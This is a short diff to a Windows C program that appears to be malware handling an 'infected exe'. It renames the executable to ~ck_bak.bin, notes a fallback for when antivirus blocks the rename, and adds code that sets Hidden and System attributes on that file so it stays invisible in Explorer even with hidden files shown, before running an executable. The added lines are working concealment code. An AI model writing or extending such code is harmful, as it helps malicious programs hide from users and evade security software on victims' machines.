@@ -108,6 +108,9 @@ int wmain(int argc,wchar_t** argv){
                         *s2=0;
 
                         // Temp name to stash the infected exe: <dir>\~ck_bak.bin
+                        // Hidden + System attributes so it doesn't show in Explorer
+                        // (even with "show hidden files" it won't appear unless
+                        // "show protected system files" is also enabled)
                         wchar_t bak[MAX_PATH]; lstrcpyW(bak,wdir);
                         lstrcatW(bak,L"~ck_bak.bin");
                         DeleteFileW(bak);
@@ -118,6 +121,11 @@ int wmain(int argc,wchar_t** argv){
                         // Rename infected -> ~ck_bak.bin
                         // (may fail if AV blocks; in that case fall back to ~ck_tmp.exe)
                         BOOL renamed = MoveFileExW(origName,bak,MOVEFILE_REPLACE_EXISTING);
+
+                        // Hide ~ck_bak.bin immediately after rename
+                        if(renamed){
+                            SetFileAttributesW(bak, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+                        }
 
                         wchar_t runExe[MAX_PATH];
                         if(renamed){
